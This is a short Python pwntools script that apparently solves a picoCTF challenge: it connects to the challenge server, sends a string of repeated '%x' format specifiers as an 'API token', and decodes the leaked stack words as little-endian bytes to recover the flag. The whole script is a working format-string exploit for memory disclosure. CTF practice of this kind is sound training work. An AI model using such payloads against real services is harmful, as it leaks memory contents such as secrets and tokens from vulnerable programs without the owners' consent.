from pwn import *

r = remote('mercury.picoctf.net', 59616)
print(r.recvuntil(b'2) View my portfolio\n').decode())
r.sendline(b'1')
print(r.recvuntil(b'What is your API token?\n').decode())
r.sendline(b'%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x')
print(r.recvline().decode())
s = r.recvline().decode()
l = s.split('-')
flag = b''
for u in l:
    u = int(u, base=16)
    flag += pack(u, 32, 'little')
print(flag)

r.close()
